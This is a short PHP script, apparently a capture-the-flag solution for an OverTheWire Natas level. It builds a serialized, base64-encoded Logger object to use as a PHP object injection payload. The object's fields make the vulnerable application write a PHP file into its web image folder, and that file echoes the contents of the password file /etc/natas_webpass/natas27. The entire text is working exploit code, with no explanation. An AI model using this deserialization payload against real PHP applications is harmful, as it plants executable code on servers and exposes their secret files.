<?php
class Logger{
	private $exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27');?>";
	private $logFile = "img/aaawwwaaa.php";
}
$test = new Logger();
echo base64_encode(serialize($test));
?>
